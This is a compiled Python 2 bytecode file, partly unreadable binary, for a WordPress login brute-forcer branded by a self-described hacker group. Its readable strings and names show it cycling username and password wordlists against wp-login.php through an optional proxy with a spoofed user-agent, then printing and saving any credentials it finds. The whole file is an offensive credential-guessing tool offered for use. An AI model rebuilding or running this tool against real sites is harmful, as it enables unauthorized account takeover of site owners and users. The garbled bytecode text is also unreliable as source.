ó
 ÿc           @   sq	  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 e j
 d  d   Z d Z e GHd GHe e j  d k r d GHd GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHd GHd GHd GHe j   n  d GHd Z d Z d Z d Z d Z d Z d Z d  Z d  Z d Z d  Z d  Z d  Z d Z d Z x~e j D]sZ e d k re j e d Z nCe d k r¯e j e d Z n#e d k rÏe j e d Z ne d k rïe j e d Z nã e d k re j e d Z nÃ e d k r$d Z n® e d k rDe j e d Z n e d k rde j e d Z nn e d k r½e j e d j  d  Z! e j" i e! d d e! d  e! d  6 Z# d Z n e d! k rÒd Z n  e d 7Z qiWe e  d  k re e  d  k rd Z n`e e  d  k r:e e  d  k r:d  Z nZ e e  d  k rge e  d  k rgd" Z n- e e  d  k re e  d  k rd# Z n  e j$   Z% e j& e%  Z' e d  k rÍe j( e'  Z) n e j( e# e'  Z) d$ e f g e) _* e% j+   e% j,   y5e) j- e  Z. e. j/   Z0 e d k ri e d% 6e d& 6d' d( 6d d) 6d* d+ 6Z1 e j2 e1  Z3 e3 GHe) j- e d, e3  Z. e. j/   Z4 e4 j5 e  d  k  re d 7Z e d- e d. e d/ 7Z d0 e d1 e GHe- d2 d3  Z6 e6 j7 e4  e6 j8   qn  e d  k r'e- e d4  Z9 xe9 D]ú Z: e: j; d5  Z i e d% 6e d& 6d' d( 6d d) 6d* d+ 6Z1 e d k r|d6 e GHn  e j2 e1  Z3 y e) j- e d, e3  Z. Wn e j< k
 rÀZ= q&n Xe. j/   Z4 e4 j5 e  d  k  r&e d 7Z e d- e d. e d/ 7Z d GHd0 e d1 e GHPq&q&Wn  e d" k re- e d4  Z9 x>e9 D]3Z: e: j; d5  Z i e d% 6e d& 6d' d( 6d d) 6d* d+ 6Z1 e d k rd6 e GHn  e j2 e1  Z3 y e) j- e d, e3  Z. Wn e j< k
 rãZ= qIn Xe. j/   Z4 e4 j5 e  d  k  rIe d 7Z e d- e d. e d/ 7Z d0 e d1 e GHe d  k rJPn  e% j+   e% j,   e) j- e  Z. e. j/   Z0 qIqIWn  e d# k r/	e- e d4  Z9 e- e d4  Z> xhe9 D]`Z: e: j; d5  Z e> j? d   x;e> D]3Z@ e@ j; d5  Z i e d% 6e d& 6d' d( 6d d) 6d* d+ 6Z1 e d k r3d6 e GHn  e j2 e1  Z3 y e) j- e d, e3  Z. Wn e j< k
 rwZ= qÝn Xe. j/   Z4 e4 j5 e  d  k  rÝe d 7Z e d- e d. e d/ 7Z d7 e d8 e GHe d  k rÞPn  e% j+   e% j,   e) j- e  Z. e. j/   Z0 qÝqÝWq´We9 j8   e> j8   n  e j   Wn0 e j< k
 rW	Z= d9 GHn eA k
 rl	d: GHn Xd S(;   i    iÿÿÿÿNt   clearc         C   sG   t  |  d  } x' | D] } | j | j d d   q W| j   d  S(   Nt   rs   
t    (   t   opent   appendt   replacet   close(   t   fileNamet   lstNamet   ft   line(    (    s   zx.pyt   loadLst
   s    s·   [1;94m
  _    _  _____   _   _ ________   ___    _  _____        
 | |  | |/ ____| | \ | |  ____\ \ / / |  | |/ ____|       
 | |  | | (___   |  \| | |__   \ V /| |  | | (___         
 | |  | |\___ \  | . ` |  __|   > < | |  | |\___ \        
 | |__| |____) | | |\  | |____ / . \| |__| |____) |       
 _\____/|_____/__|_|_\_|______/_/_\_\\____/|_____/ _      
 \ \        / /  ____|  _ \  |__   __/ __ \ / __ \| |     
  \ \  /\  / /| |__  | |_) |    | | | |  | | |  | | |     
   \ \/  \/ / |  __| |  _ <     | | | |  | | |  | | |     
    \  /\  /  | |____| |_) |    | | | |__| | |__| | |____ 
     \/  \/   |______|____/     |_|  \____/ \____/|______|
                                                          
Created By : [1;96mUSNEXUS [1;31m|[1;0m [V H3NTAI V1]

[1;32m------------------------------------------
[93m AUTHOR  : US NEXUS HACKERS
[93m GITHUB  : github.com/us-nexus-hackers
[93m TG      : t.me/usnexushacker
[93m TYPE    : ZY
[1;32m------------------------------------------
R   i   s   [1;032ms   Options:s   -h URLs   -U file Wordlist users   -P file Wordlist passwords   -u usernames   -p passwords>   -v verbose mode / show login+pass combination for each attempts+   -f continue after found login/password pairsZ   -g user-agent - default: "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"s!   -x use proxy | ex: 127.0.0.1:1234s]   usage: python2 scriptname.py -h https://test.com/wp-login.php -u admin -P listpassword.txt -vs   type="password"s?   Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0s   -hs   -us   -Us   -ps   -Ps   -vs   -ss   -gs   -xt   :i   s   -fi   i   s
   User-agentt   logt   pwds   Log Ins	   wp-submitt   redirect_tot   1t
   testcookiet   /s
   username: s      password: s   
s=   [1;31m[+] [1;32mPassword Found : Username [1;31m>> [1;32ms"    [1;32mPassword [1;31m>> [1;32ms	   test.htmlt   wR   s   
s#   [91m >> [1;32mChecking  : [1;36ms!   [+] Password Found : Username >> s    Password >> s?   
	[!] Session Cancelled; Error occured. Check internet settingss   
	[!] Session cancelled(B   t   Falset   foot   bart   syst   urllib2t   urllibt	   cookielibt   ret   ost   timet   systemR   t   logot   lent   argvt   exitt   urlt   wordlistt   usernamet   passwordt   passFilet   userFilet   signalt   countt   countAcct   modet   verboset   useProxyt	   continuest   agentt   resultt   argt   splitt   lstTmpt   ProxyHandlert   proxyHandlert	   CookieJart	   cookieJart   HTTPCookieProcessort   cookieHandlert   build_openert   openert
   addheadersR    t   clear_session_cookiesR   t   responset   readt   contentt   valuest	   urlencodet   datat   strTmpt   findt   f3t   writeR   R	   R
   t   stript   URLErrort   et   f2t   seekt   line2t   KeyboardInterrupt(    (    (    s   zx.pyt   <module>   sn  
T		*		$	$	$	$	














